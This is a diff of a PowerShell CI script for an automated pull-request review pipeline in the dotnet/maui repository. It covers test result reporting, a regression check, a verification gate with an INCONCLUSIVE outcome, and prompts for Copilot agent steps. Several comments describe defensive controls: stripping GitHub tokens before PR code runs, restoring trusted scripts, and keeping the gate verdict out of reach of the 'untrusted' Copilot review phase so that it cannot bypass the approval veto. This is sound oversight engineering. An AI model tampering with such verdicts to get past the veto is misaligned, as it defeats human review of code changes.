-        $uitestRunResult = "FAILED"
-        Write-Host ""
-        Write-Host "  🔴 UI test result: $uitestPassed passed, $uitestFailed FAILED, $uitestSkipped skipped" -ForegroundColor Red
-    } elseif ($uitestPassed -gt 0) {
-        $uitestRunResult = "PASSED"
-        Write-Host ""
-        Write-Host "  ✅ UI test result: $uitestPassed passed, $uitestSkipped skipped" -ForegroundColor Green
-    } else {
-        $uitestRunResult = "SKIPPED"
-        Write-Host ""
-        Write-Host "  ⏭️  All UI categories skipped ($uitestSkipped total)" -ForegroundColor DarkGray
-    }
-
-    # Append a results table to the existing uitests/content.md so the same
-    # collapsible "UI Tests — Category Detection" section in the AI summary
-    # comment now contains both the detected list and the run results.
-    $uitestContentFile = Join-Path $uitestRunOutputDir "content.md"
-    $appendMd = New-Object System.Text.StringBuilder
-    [void]$appendMd.AppendLine()
-    [void]$appendMd.AppendLine("### 🧪 UI Test Execution Results")
-    [void]$appendMd.AppendLine()
-    $resultIcon = switch ($uitestRunResult) { "PASSED" { "✅" }; "FAILED" { "❌" }; default { "⏭️" } }
-    [void]$appendMd.AppendLine("$resultIcon **$uitestRunResult** — $uitestPassed passed, $uitestFailed failed, $uitestSkipped skipped (platform: ``$uitestPlatform``)")
-    [void]$appendMd.AppendLine()
-    if ($uitestDetails.Count -gt 0) {
-        [void]$appendMd.AppendLine("| Category | Result | Tests | Duration | Notes |")
-        [void]$appendMd.AppendLine("|---|---|---|---|---|")
-        foreach ($d in $uitestDetails) {
-            $icon = switch ($d.result) { "PASSED" { "✅" }; "FAILED" { "❌" }; default { "⏭️" } }
-            # Tests column: e.g. "1/1 ✓" on pass, "0/1 (1 ❌)" on fail. When the
-            # category itself failed but no per-test failures were parsed (e.g.
-            # build/deploy crashed before tests ran), don't claim a green ✓ —
-            # show "build/deploy failed" so reviewers aren't misled.
-            $tCount = if ($null -ne $d.tests_total) { [int]$d.tests_total } else { 0 }
-            $tPass  = if ($null -ne $d.tests_passed) { [int]$d.tests_passed } else { 0 }
-            $tFail  = if ($null -ne $d.tests_failed) { [int]$d.tests_failed } else { 0 }
-            $testsCol = if ($d.infra_failure) {
-                            "🛠️ infra failure ($tFail bogus failures)"
-                        }
-                        elseif ($d.result -eq 'FAILED' -and $tFail -eq 0) {
-                            if ($tCount -eq 0) { "build/deploy failed" }
-                            else { "$tPass/$tCount — build/deploy failed before per-test results" }
-                        }
-                        elseif ($tCount -eq 0) { "—" }
-                        elseif ($tFail -gt 0) { "$tPass/$tCount ($tFail ❌)" }
-                        else { "$tPass/$tCount ✓" }
-            $notes = if ($d.infra_failure) { "infra: $($d.infra_failure)" }
-                     elseif ($d.exit_code) { "exit code $($d.exit_code)" }
-                     elseif ($d.reason)    { $d.reason }
-                     else                  { "" }
-            [void]$appendMd.AppendLine("| ``$($d.category)`` | $icon $($d.result) | $testsCol | $($d.duration_s)s | $notes |")
-        }
-    }
-    [void]$appendMd.AppendLine()
-
-    # Per-failed-category breakdown: collapsible block with each failed test's
-    # name, error message, and first stack frame so a reviewer can diagnose
-    # without downloading the full build artifact. When a category failed but
-    # produced no per-test failures (build/deploy crashed), surface the last
-    # 30 lines of stdout so the AI summary still pinpoints the cause.
-    $failedCats = @($uitestDetails | Where-Object { $_.result -eq 'FAILED' -and (($_.failed_tests -and $_.failed_tests.Count -gt 0) -or $_.build_tail) })
-    $infraCats = @($failedCats | Where-Object { $_.infra_failure })
-    if ($infraCats.Count -gt 0) {
-        [void]$appendMd.AppendLine("> ⚠️ **Infrastructure failure detected** — for $($infraCats.Count) categor$(if ($infraCats.Count -eq 1) { 'y' } else { 'ies' }) below, the HostApp couldn't be installed or launched on the device (build/deploy failed). NUnit then reports every test in the assembly as failed. **These are NOT real test regressions** — the test runner never started. Look for ``$($infraCats[0].infra_failure)`` in the build log.")
-        [void]$appendMd.AppendLine()
-    }
-    if ($failedCats.Count -gt 0) {
-        [void]$appendMd.AppendLine("#### Failed test details")
-        [void]$appendMd.AppendLine()
-        foreach ($d in $failedCats) {
-            $hasFailedTests = $d.failed_tests -and $d.failed_tests.Count -gt 0
-            $headSummary = if ($d.infra_failure) {
-                "🛠️ <code>$($d.category)</code> — infra failure ($($d.failed_tests.Count) bogus failures, app never installed)"
-            } elseif ($hasFailedTests) {
-                "❌ <code>$($d.category)</code> — $($d.failed_tests.Count) failed test$(if ($d.failed_tests.Count -ne 1) { 's' })"
-            } else {
-                "❌ <code>$($d.category)</code> — build/deploy failed (no per-test results)"
-            }
-            [void]$appendMd.AppendLine("<details><summary>$headSummary</summary>")
-            [void]$appendMd.AppendLine()
-            if ($hasFailedTests) {
-                # GitHub's comment body limit is 65,536 chars; large categories
-                # can have 100+ failures with multi-KB error messages each.
-                # Group by error message to dedup the common "OneTimeSetUp:
-                # Timed out…" cases (one root cause, N tests). Show full
-                # detail for the first 5 unique errors, then a compact list.
-                # @() wrap is required: Group-Object on a single unique key
-                # returns ONE GroupInfo (not an array), and `.Count` on a
-                # GroupInfo returns the size of the group, not the number of
-                # groups — without @() the foreach below would iterate the
-                # group's members instead of the groups themselves.
-                $byErr = @($d.failed_tests | Group-Object -Property {
-                    if ($_.error) { ($_.error -as [string]).Substring(0, [Math]::Min(200, ([string]$_.error).Length)) } else { '<no error>' }
-                } | Sort-Object Count -Descending)
-
-                $shownGroups = 0
-                foreach ($g in $byErr) {
-                    if ($shownGroups -ge 5) {
-                        $remaining = ($byErr | Select-Object -Skip 5 | Measure-Object -Property Count -Sum).Sum
-                        [void]$appendMd.AppendLine("…and $remaining more failure(s) with other error signatures (see CopilotLogs artifact for full detail).")
-                        [void]$appendMd.AppendLine()
-                        break
-                    }
-                    $shownGroups++
-
-                    $first = $g.Group[0]
-                    $count = $g.Count
-                    if ($count -gt 1) {
-                        $sampleNames = ($g.Group | Select-Object -First 3 | ForEach-Object { "``$($_.name)``" }) -join ', '
-                        $more = if ($count -gt 3) { ", … (+$($count - 3) more)" } else { '' }
-                        [void]$appendMd.AppendLine("**$count tests failed with the same error** — e.g. $sampleNames$more")
-                    } else {
-                        [void]$appendMd.AppendLine("**``$($first.name)``** *(took $($first.duration))*")
-                    }
-                    [void]$appendMd.AppendLine()
-
-                    $errBody = if ($first.error) {
-                        $e = [string]$first.error
-                        if ($e.Length -gt 1500) { $e.Substring(0, 1500) + "`n…(truncated)" } else { $e }
-                    } else { "_(no error message captured)_" }
-                    [void]$appendMd.AppendLine('```')
-                    [void]$appendMd.AppendLine($errBody)
-                    [void]$appendMd.AppendLine('```')
-                    if ($first.stack) {
-                        $firstFrame = ($first.stack -split "`n" | Where-Object { $_.Trim() } | Select-Object -First 1)
-                        if ($firstFrame) {
-                            [void]$appendMd.AppendLine("> at $($firstFrame.Trim().TrimStart('a','t',' '))")
-                            [void]$appendMd.AppendLine()
-                        }
-                    }
-                }
-
-                # Always print a compact name-only list of every failed test
-                # so reviewers know exactly which tests need to be re-run,
-                # even if their error matched a deduped group above.
-                if ($d.failed_tests.Count -gt 1) {
-                    [void]$appendMd.AppendLine("<details><summary>All $($d.failed_tests.Count) failed test names</summary>")
-                    [void]$appendMd.AppendLine()
-                    foreach ($ft in $d.failed_tests) {
-                        [void]$appendMd.AppendLine("- ``$($ft.name)``")
-                    }
-                    [void]$appendMd.AppendLine()
-                    [void]$appendMd.AppendLine("</details>")
-                    [void]$appendMd.AppendLine()
-                }
-            }
-            if ($d.build_tail) {
-                $tail = [string]$d.build_tail
-                if ($tail.Length -gt 3000) { $tail = $tail.Substring($tail.Length - 3000) }
-                [void]$appendMd.AppendLine("Last 30 lines of build/test stdout:")
-                [void]$appendMd.AppendLine()
-                [void]$appendMd.AppendLine('```')
-                [void]$appendMd.AppendLine($tail)
-                [void]$appendMd.AppendLine('```')
-            }
-            [void]$appendMd.AppendLine()
-            [void]$appendMd.AppendLine("</details>")
-            [void]$appendMd.AppendLine()
-        }
-    }
-
-    # Per-passed-category mini-summary: only emitted if there were ANY passed
-    # tests, so empty/skipped runs stay quiet.
-    $passedCats = @($uitestDetails | Where-Object { $_.passed_tests -and $_.passed_tests.Count -gt 0 -and $_.result -eq 'PASSED' })
-    if ($passedCats.Count -gt 0) {
-        [void]$appendMd.AppendLine("<details><summary>Show $(($passedCats | Measure-Object -Property tests_passed -Sum).Sum) passed test name(s)</summary>")
-        [void]$appendMd.AppendLine()
-        foreach ($d in $passedCats) {
-            [void]$appendMd.AppendLine("**``$($d.category)``**")
-            [void]$appendMd.AppendLine()
-            foreach ($pt in $d.passed_tests) {
-                [void]$appendMd.AppendLine("- ``$($pt.name)`` *($($pt.duration))*")
-            }
-            [void]$appendMd.AppendLine()
-        }
-        [void]$appendMd.AppendLine("</details>")
-        [void]$appendMd.AppendLine()
-    }
-    [void]$appendMd.AppendLine("_Failures here are informational only — they do not block the gate or affect try-fix candidate scoring._")
-    Add-Content $uitestContentFile $appendMd.ToString() -Encoding UTF8
-
-    # JSON summary for downstream consumers / debugging.
-    @{
-        result   = $uitestRunResult
-        platform = $uitestPlatform
-        passed   = $uitestPassed
-        failed   = $uitestFailed
-        skipped  = $uitestSkipped
-        details  = $uitestDetails
-    } | ConvertTo-Json -Depth 4 | Set-Content (Join-Path $uitestRunOutputDir "test-results.json") -Encoding UTF8
-
-    # result.txt — one-line traceability marker (PASSED / FAILED / SKIPPED).
-    $uitestRunResult | Set-Content (Join-Path $uitestRunOutputDir "result.txt") -Encoding UTF8
-}
-
-# Restore the review branch in case BuildAndRunHostApp.ps1 (or any of its
-# child invocations) detached HEAD or switched branches.
-git checkout $reviewBranch 2>$null | Out-Null
-if ($LASTEXITCODE -ne 0) {
-    Write-Host "  ⚠️ Failed to restore review branch '$reviewBranch' after Step 3 — subsequent steps may run against the wrong tree" -ForegroundColor Red
-}
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  STEP 4: REGRESSION CROSS-REFERENCE (script, no copilot agent)
+#  STEP 3: REGRESSION CROSS-REFERENCE (script, no copilot agent)
 # ═════════════════════════════════════════════════════════════════════════════
 
 Write-Host ""
 Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║  STEP 4: REGRESSION CROSS-REFERENCE                      ║" -ForegroundColor Cyan
+Write-Host "║  STEP 3: REGRESSION CROSS-REFERENCE                      ║" -ForegroundColor Cyan
 Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
 
 $regressionOutputDir = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/regression-check"
-$regressionScript = Join-Path $PSScriptRoot "Find-RegressionRisks.ps1"
+$regressionScript = Join-Path $ScriptsDir "Find-RegressionRisks.ps1"
 if (Test-Path $regressionScript) {
     try {
         & $regressionScript -PRNumber $PRNumber -OutputDir $regressionOutputDir
@@ -1168,7 +1486,7 @@ if (Test-Path $regressionScript) {
     Write-Host "  ⚠️ Find-RegressionRisks.ps1 not found" -ForegroundColor Yellow
 }
 
-# --- Regression Test Execution (part of STEP 4) ---
+# --- Regression Test Execution (part of STEP 3) ---
 $regressionTestResult = "SKIPPED"
 $regressionRisksJson = Join-Path $regressionOutputDir "risks.json"
 if (Test-Path $regressionRisksJson) {
@@ -1209,8 +1527,8 @@ if ($risksData -and ($risksData.result -eq 'REVERT' -or $risksData.result -eq 'O
         $regrTestDetails = @()
 
         $regrPlatform = if ($Platform) { $Platform } else { "android" }
-        $uiTestRunner = Join-Path $RepoRoot ".github/scripts/BuildAndRunHostApp.ps1"
-        $deviceTestRunner = Join-Path $RepoRoot ".github/skills/run-device-tests/scripts/Run-DeviceTests.ps1"
+        $uiTestRunner = Join-Path $ScriptsDir "BuildAndRunHostApp.ps1"
+        $deviceTestRunner = Join-Path $SkillsDir "run-device-tests/scripts/Run-DeviceTests.ps1"
 
         foreach ($t in $regressionTests) {
             Write-Host ""
@@ -1221,7 +1539,7 @@ if ($risksData -and ($risksData.result -eq 'REVERT' -or $risksData.result -eq 'O
                     'UITest' {
                         if (Test-Path $uiTestRunner) {
                             Write-Host "    🖥️ Running UI test via BuildAndRunHostApp.ps1 -Platform $regrPlatform -TestFilter `"$($t.Filter)`"" -ForegroundColor Cyan
-                            $testOutput = & $uiTestRunner -Platform $regrPlatform -TestFilter $t.Filter 2>&1
+                            $testOutput = Invoke-WithoutGhTokens { & $uiTestRunner -Platform $regrPlatform -TestFilter $t.Filter 2>&1 }
                             $testExitCode = $LASTEXITCODE
                             $testOutput | Select-Object -Last 20 | ForEach-Object { Write-Host "    $_" }
                         } else {
@@ -1233,7 +1551,7 @@ if ($risksData -and ($risksData.result -eq 'REVERT' -or $risksData.result -eq 'O
                         if (Test-Path $deviceTestRunner) {
                             $dtProject = if ($t.Project) { $t.Project } else { 'Controls' }
                             Write-Host "    📱 Running device test via Run-DeviceTests.ps1 -Project $dtProject -Platform $regrPlatform -TestFilter `"$($t.Filter)`"" -ForegroundColor Cyan
-                            $testOutput = & $deviceTestRunner -Project $dtProject -Platform $regrPlatform -TestFilter $t.Filter 2>&1
+                            $testOutput = Invoke-WithoutGhTokens { & $deviceTestRunner -Project $dtProject -Platform $regrPlatform -TestFilter $t.Filter 2>&1 }
                             $testExitCode = $LASTEXITCODE
                             $testOutput | Select-Object -Last 20 | ForEach-Object { Write-Host "    $_" }
                         } else {
@@ -1245,7 +1563,7 @@ if ($risksData -and ($risksData.result -eq 'REVERT' -or $risksData.result -eq 'O
                         if ($t.ProjectPath) {
                             $resolvedProj = Join-Path $RepoRoot $t.ProjectPath
                             Write-Host "    🧪 Running: dotnet test $($t.ProjectPath) --filter `"$($t.Filter)`"" -ForegroundColor Cyan
-                            $testOutput = dotnet test $resolvedProj --filter $t.Filter --logger "console;verbosity=minimal" 2>&1
+                            $testOutput = Invoke-WithoutGhTokens { dotnet test $resolvedProj --filter $t.Filter --logger "console;verbosity=minimal" 2>&1 }
                             $testExitCode = $LASTEXITCODE
                             $testOutput | Select-Object -Last 20 | ForEach-Object { Write-Host "    $_" }
                         } else {
@@ -1324,14 +1642,14 @@ if ($risksData -and ($risksData.result -eq 'REVERT' -or $risksData.result -eq 'O
 }
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  STEP 5: Gate - Test Before and After Fix (script, no copilot agent)
+#  STEP 4: Gate - Test Before and After Fix (script, no copilot agent)
 # ═════════════════════════════════════════════════════════════════════════════
 
-# TEMP: Skip Gate (STEP 5) + Try-Fix (STEP 6) for fast iteration on the
+# TEMP: Skip Gate (STEP 4) + Try-Fix (STEP 5) for fast iteration on the
 # inline-stages architecture. Both phases are expensive (build the whole
-# repo, run agents on multiple candidates) and we just need STEPs 1-4 +
-# STEP 7 (post comment) to validate that detectedCategories /
-# aiSummaryCommentId output variables flow through to the new
+# repo, run agents on multiple candidates) and we just need STEPs 1-3 +
+# STEP 6 (post comment) to validate that detectedCategories /
+# aiSummaryReviewId output variables flow through to the new
 # RunDeepUITests + UpdateAISummaryComment stages. Flip $skipGateAndTryFix
 # back to $false (or delete the wrapper) once the new pipeline stages
 # are validated end-to-end.
@@ -1340,7 +1658,7 @@ if (-not $skipGateAndTryFix) {
 
 Write-Host ""
 Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Yellow
-Write-Host "║  STEP 5: GATE — TEST VERIFICATION                         ║" -ForegroundColor Yellow
+Write-Host "║  STEP 4: GATE — TEST VERIFICATION                         ║" -ForegroundColor Yellow
 Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Yellow
 
 $gateOutputDir = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/gate"
@@ -1348,7 +1666,7 @@ New-Item -ItemType Directory -Force -Path $gateOutputDir | Out-Null
 
 # Detect tests in PR
 Write-Host "  🔍 Detecting tests in PR #$PRNumber..." -ForegroundColor Cyan
-$testDetectScript = Join-Path $PSScriptRoot "shared/Detect-TestsInDiff.ps1"
+$testDetectScript = Join-Path $ScriptsDir "shared/Detect-TestsInDiff.ps1"
 if (Test-Path $testDetectScript) {
     $testDetectScript = (Resolve-Path $testDetectScript).Path
     & pwsh -NoProfile -File $testDetectScript -PRNumber $PRNumber 2>&1 | ForEach-Object { Write-Host "    $_" }
@@ -1360,7 +1678,7 @@ if (Test-Path $testDetectScript) {
 $gatePlatform = if ($Platform) { $Platform } else { "android" }
 Write-Host "  🧪 Running gate on platform: $gatePlatform" -ForegroundColor Cyan
 
-$verifyScript = [System.IO.Path]::GetFullPath((Join-Path $PSScriptRoot "../skills/verify-tests-fail-without-fix/scripts/verify-tests-fail.ps1"))
+$verifyScript = [System.IO.Path]::GetFullPath((Join-Path $SkillsDir "verify-tests-fail-without-fix/scripts/verify-tests-fail.ps1"))
 if (-not (Test-Path $verifyScript)) {
     Write-Host "  ❌ verify-tests-fail.ps1 not found at: $verifyScript" -ForegroundColor Red
     # $gateExitCode = 1 ensures the switch at line ~561 produces $gateResult = "FAILED"
@@ -1379,6 +1697,26 @@ for ($gateAttempt = 1; $gateAttempt -le $maxGateAttempts; $gateAttempt++) {
     if ($gateAttempt -gt 1) {
         Write-Host "  🔄 Retry $gateAttempt/$maxGateAttempts — previous attempt hit environment error" -ForegroundColor Yellow
     }
+    if (-not $DryRun) {
+        # Each verification attempt mutates fix files while testing the without-fix
+        # state. If an attempt aborts before restoring those files, retries must
+        # start from the committed review branch or they fail immediately with
+        # "uncommitted changes detected in fix files".
+        git checkout $reviewBranch 2>$null | Out-Null
+        if ($LASTEXITCODE -ne 0) {
+            Write-Error "Failed to checkout review branch '$reviewBranch' before gate attempt $gateAttempt."
+            exit 1
+        }
+        git reset --hard HEAD 2>$null | Out-Null
+        if ($LASTEXITCODE -ne 0) {
+            Write-Error "Failed to reset review branch '$reviewBranch' before gate attempt $gateAttempt."
+            exit 1
+        }
+        # `git reset --hard` above reverts the worktree's .github to the (possibly stale) PR
+        # branch copies, so re-apply the trusted, branch-aware infra scripts before the verify
+        # script invokes the worktree's Run-DeviceTests.ps1 / BuildAndRunHostApp.ps1.
+        Restore-TrustedScripts -TrustedScriptsDir $TrustedScriptsDir -RepoRoot $RepoRoot
+    }
     # Clear previous attempt's report so a crash mid-run doesn't leak its classification into this one.
     Remove-Item $gateContentFile -Force -ErrorAction SilentlyContinue
     # Note: -RequireFullVerification is intentionally OMITTED. The verify script
@@ -1386,6 +1724,10 @@ for ($gateAttempt = 1; $gateAttempt -le $maxGateAttempts; $gateAttempt++) {
     # PR like a regression repro), it falls back to "verify failure only" mode
     # and reports whether the new tests fail without any fix. Passing the flag
     # would force the script to error out for those PRs.
+    # Note: NOT wrapped in Invoke-WithoutGhTokens here — verify-tests-fail.ps1
+    # itself needs GH_TOKEN to invoke Detect-TestsInDiff.ps1 (which calls `gh api`
+    # to enumerate PR files). The script wraps its OWN dotnet/host-app/device-test
+    # subprocess invocations internally to strip the token before PR code runs.
     $gateOutput = & pwsh -NoProfile -File "$verifyScript" -Platform $gatePlatform -PRNumber $PRNumber 2>&1
     $gateExitCode = $LASTEXITCODE
     $gateOutput | ForEach-Object { Write-Host "    $_" }
@@ -1423,17 +1765,22 @@ if ($isEnvError) {
     # at the top of the next iteration but we'd never get here). $isEnvError
     # here means "all $maxGateAttempts attempts hit env errors" — not "any".
     Write-Host "  ⚠️ All $maxGateAttempts gate attempts hit environment errors" -ForegroundColor Yellow
+    # Persistent env error = the gate could not verify anything. Report INCONCLUSIVE
+    # (exit 3) rather than letting it fall through to FAILED, so infra flakes don't
+    # masquerade as a broken fix.
+    $gateExitCode = 3
 }
 
 } # end else (verify script exists)
 
-# Exit code: 0 = passed, 1 = verification failed, 2 = no tests detected
+# Exit code: 0 = passed, 1 = verification failed, 2 = no tests detected, 3 = inconclusive (build/env error)
 $gateResult = switch ($gateExitCode) {
     0 { "PASSED" }
     2 { "SKIPPED" }
+    3 { "INCONCLUSIVE" }
     default { "FAILED" }
 }
-$gateColor = switch ($gateResult) { "PASSED" { "Green" } "SKIPPED" { "Yellow" } default { "Red" } }
+$gateColor = switch ($gateResult) { "PASSED" { "Green" } "SKIPPED" { "Yellow" } "INCONCLUSIVE" { "Yellow" } default { "Red" } }
 Write-Host "  📁 Gate result: $gateResult" -ForegroundColor $gateColor
 
 # Copy the verification report to gate/content.md (always overwrite — the report is the source of truth)
@@ -1517,7 +1864,7 @@ if (Test-Path $verificationReport) {
     } else {
         # Report exists but has bad format — generate fallback with logs
         Write-Host "  ⚠️ Verification report has invalid format — using fallback" -ForegroundColor Yellow
-        $resultIcon = switch ($gateResult) { "PASSED" { "✅" } "SKIPPED" { "⚠️" } default { "❌" } }
+        $resultIcon = switch ($gateResult) { "PASSED" { "✅" } "SKIPPED" { "⚠️" } "INCONCLUSIVE" { "⚠️" } default { "❌" } }
         $fallbackDetails = Get-GateFallbackDetails -Tail $gateLogTail -ExitCode $gateExitCode -VerifyDir (Join-Path $gateOutputDir "verify-tests-fail") -ReviewedPlatform $gatePlatform
         @"
 ### Gate Result: $resultIcon $gateResult
@@ -1548,7 +1895,7 @@ No tests were detected in this PR.
 **Recommendation:** Add tests to verify the fix using the ``write-tests-agent``.
 "@ | Set-Content (Join-Path $gateOutputDir "content.md") -Encoding UTF8
     } else {
-        $resultIcon = switch ($gateResult) { "PASSED" { "✅" } default { "❌" } }
+        $resultIcon = switch ($gateResult) { "PASSED" { "✅" } "INCONCLUSIVE" { "⚠️" } default { "❌" } }
         $fallbackDetails = Get-GateFallbackDetails -Tail $gateLogTail -ExitCode $gateExitCode -VerifyDir (Join-Path $gateOutputDir "verify-tests-fail") -ReviewedPlatform $gatePlatform
         @"
 ### Gate Result: $resultIcon $gateResult
@@ -1571,59 +1918,126 @@ $gateLogTail
     }
 }
 
-# Post gate result as a separate PR comment
-$postGateScript = Join-Path $PSScriptRoot "post-gate-comment.ps1"
-if (Test-Path $postGateScript) {
+# Persist gate result so other phases can read it
+$gateVerdictDir = if ($TrustedScriptsDir) {
+    Split-Path $TrustedScriptsDir -Parent
+} else {
+    $d = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/gate"
+    New-Item -ItemType Directory -Force -Path $d | Out-Null
+    $d
+}
+$gateResult | Set-Content (Join-Path $gateVerdictDir "gate-result.txt") -Encoding UTF8
+# Also persist into PRAgent/gate, which ships in the CopilotLogs artifact. This copy is used
+# only for DISPLAY (the gate label and the rendered gate section) — it is NOT trusted for the
+# APPROVE veto. The veto keys off the trusted Gate-task output variable (RunGate.gateResult),
+# captured from the staging-root copy above before the untrusted CopilotReview phase runs, so a
+# later overwrite of this artifact copy cannot bypass the veto.
+$gateResult | Set-Content (Join-Path $gateOutputDir "gate-result.txt") -Encoding UTF8
+Write-Host "  📄 Gate result persisted: $gateResult" -ForegroundColor Gray
+
+# Persist regression data for CopilotReview phase (try-fix instructions)
+if ($risksData) {
     try {
-        if ($DryRun) {
-            & $postGateScript -PRNumber $PRNumber -DryRun
-        } else {
-            & $postGateScript -PRNumber $PRNumber
+        $risksData | ConvertTo-Json -Depth 10 -Compress | Set-Content (Join-Path $gateVerdictDir "regression-risks.json") -Encoding UTF8
+        if ($regressionTests -and $regressionTests.Count -gt 0) {
+            @($regressionTests) | ConvertTo-Json -Depth 5 -Compress | Set-Content (Join-Path $gateVerdictDir "regression-tests.json") -Encoding UTF8
         }
+        if ($regrPlatform) {
+            $regrPlatform | Set-Content (Join-Path $gateVerdictDir "regression-platform.txt") -Encoding UTF8
+        }
+        Write-Host "  📄 Regression data persisted" -ForegroundColor Gray
     } catch {
-        Write-Host "  ⚠️ Failed to post gate comment (non-fatal): $_" -ForegroundColor Yellow
+        Write-Host "  ⚠️ Failed to persist regression data (non-fatal): $_" -ForegroundColor Yellow
     }
-} else {
-    Write-Host "  ⚠️ post-gate-comment.ps1 not found" -ForegroundColor Yellow
 }
 
-# Apply gate result label
-$gatePassLabel = "s/agent-gate-passed"
-$gateFaillabel = "s/agent-gate-failed"
-$gateSkipLabel = "s/agent-gate-skipped"
-$allGateLabels = @($gatePassLabel, $gateFaillabel, $gateSkipLabel)
-
-$addLabel = switch ($gateResult) {
-    "PASSED"  { $gatePassLabel }
-    "SKIPPED" { $gateSkipLabel }
-    default   { $gateFaillabel }
+# Persist detect script path and detected categories for Tier 3 refresh
+if ($detectScript) {
+    $detectScript | Set-Content (Join-Path $gateVerdictDir "detect-script-path.txt") -Encoding UTF8
 }
-$removeLabels = $allGateLabels | Where-Object { $_ -ne $addLabel }
+$uitestCategories | Set-Content (Join-Path $gateVerdictDir "uitest-categories.txt") -Encoding UTF8
 
-if (-not $DryRun) {
-    foreach ($lbl in $removeLabels) {
-        gh pr edit $PRNumber --remove-label $lbl --repo dotnet/maui 2>$null | Out-Null
+} # end if (-not $skipGateAndTryFix)
+
+} # end if ($runGate)
+
+# In phased CI mode the Gate step's process exit code drives the GateFailed pipeline
+# variable (eng/pipelines/ci-copilot.yml "Check Review Result"). Make that explicit and
+# verdict-driven: only a genuine FAILED gate blocks the PR. PASSED / SKIPPED (no tests) /
+# INCONCLUSIVE (build or environment error — the gate could not verify anything) must NOT
+# block, so they exit 0. This stops infra/build flakes from masquerading as a failing fix.
+if ($runGate -and $Phase -eq 'Gate') {
+    if ($LogFile) { Stop-Transcript -ErrorAction SilentlyContinue | Out-Null }
+    if ($gateResult -eq 'FAILED') {
+        Write-Host "  ⛔ Gate verdict FAILED — signaling blocking exit (1)" -ForegroundColor Red
+        exit 1
     }
-    gh pr edit $PRNumber --add-label $addLabel --repo dotnet/maui 2>$null | Out-Null
-    if ($LASTEXITCODE -eq 0) {
-        Write-Host "  🏷️ Label: $addLabel" -ForegroundColor Cyan
+    Write-Host "  ✅ Gate verdict '$gateResult' is non-blocking — exit 0" -ForegroundColor Green
+    exit 0
+}
+
+# ─── Phase: CopilotReview ──────────────────────────────────────────────────
+if ($runCopilotReview) {
+
+# Restore gate result from file when running in phased mode
+if ($Phase -eq 'CopilotReview') {
+    $gateVerdictDir = if ($TrustedScriptsDir) {
+        Split-Path $TrustedScriptsDir -Parent
     } else {
-        Write-Host "  ⚠️ Failed to apply label $addLabel" -ForegroundColor Yellow
+        Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/gate"
     }
-} else {
-    Write-Host "  [DRY RUN] Would set label: $addLabel" -ForegroundColor Magenta
+    $gateVerdictFile = Join-Path $gateVerdictDir "gate-result.txt"
+    if (Test-Path $gateVerdictFile) {
+        $gateResult = (Get-Content $gateVerdictFile -Raw).Trim()
+        Write-Host "  📄 Restored gate result: $gateResult" -ForegroundColor Gray
+    } else {
+        $gateResult = "SKIPPED"
+        Write-Host "  ⚠️ Gate result file not found — defaulting to SKIPPED" -ForegroundColor Yellow
+    }
+
+    # Restore regression data persisted by Gate phase
+    $risksFile = Join-Path $gateVerdictDir "regression-risks.json"
+    $testsFile = Join-Path $gateVerdictDir "regression-tests.json"
+    $platFile  = Join-Path $gateVerdictDir "regression-platform.txt"
+    if (Test-Path $risksFile) {
+        try {
+            $risksData = Get-Content $risksFile -Raw -Encoding UTF8 | ConvertFrom-Json
+            if (Test-Path $testsFile) {
+                $regressionTests = @(Get-Content $testsFile -Raw -Encoding UTF8 | ConvertFrom-Json)
+            }
+            if (Test-Path $platFile) {
+                $regrPlatform = (Get-Content $platFile -Raw).Trim()
+            } else {
+                $regrPlatform = if ($Platform) { $Platform } else { "android" }
+            }
+            Write-Host "  📄 Restored regression data ($($regressionTests.Count) tests)" -ForegroundColor Gray
+        } catch {
+            Write-Host "  ⚠️ Failed to restore regression data (non-fatal): $_" -ForegroundColor Yellow
+        }
+    }
+
+    # Restore detect script path and UI test categories for Tier 3 refresh
+    $detectPathFile = Join-Path $gateVerdictDir "detect-script-path.txt"
+    $catsFile       = Join-Path $gateVerdictDir "uitest-categories.txt"
+    if (Test-Path $detectPathFile) {
+        $detectScript = (Get-Content $detectPathFile -Raw).Trim()
+    }
+    if (Test-Path $catsFile) {
+        $uitestCategories = (Get-Content $catsFile -Raw).Trim()
+    }
 }
 
 # Restore review branch
 git checkout $reviewBranch 2>$null | Out-Null
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  STEP 6: PR Review (3-phase skill: Pre-Flight, Try-Fix, Report)
+#  STEP 5: PR Review (3-phase skill: Pre-Flight, Try-Fix, Report)
 # ═════════════════════════════════════════════════════════════════════════════
 
 $gateStatusForPrompt = switch ($gateResult) {
     "PASSED" { "Gate ✅ PASSED — tests FAIL without fix, PASS with fix." }
     "SKIPPED" { "Gate ⚠️ SKIPPED — no tests detected in this PR. Consider suggesting the author add tests." }
+    "INCONCLUSIVE" { "Gate ⚠️ INCONCLUSIVE — the tests could not be built/run (build or environment error), so the fix is UNVERIFIED. Do NOT treat this as a failing fix and do NOT request changes solely because of the gate; review the code on its merits." }
     default { "Gate ❌ FAILED — tests did NOT behave as expected." }
 }
 
@@ -1653,8 +2067,8 @@ Run these AFTER your primary test command succeeds. If any regression test fails
     }
 }
 
-# ── STEP 6a: Try-Fix — iterative candidate generation (Copilot call 1) ────
-$step6aPrompt = @"
+# ── STEP 5a: Try-Fix — iterative candidate generation (Copilot call 1) ────
+$step5aPrompt = @"
 Generate alternative fix candidates for PR #$PRNumber using an iterative expert-review-and-test loop.
 
 ## Phase 1 — Pre-Flight (context only)
@@ -1688,14 +2102,14 @@ Do NOT re-run gate verification. The gate phase is handled separately.
 ⚠️ Do NOT create or overwrite ``gate/content.md`` — it is already generated by the gate script with detailed test output.
 "@
 
-Invoke-CopilotStep -StepName "STEP 6a: TRY-FIX" -Prompt $step6aPrompt | Out-Null
+Invoke-CopilotStep -StepName "STEP 5a: TRY-FIX" -Prompt $step5aPrompt | Out-Null
 
 # Restore review branch between copilot calls
 git checkout $reviewBranch 2>$null | Out-Null
 
-# Diagnostic: check what STEP 6a produced
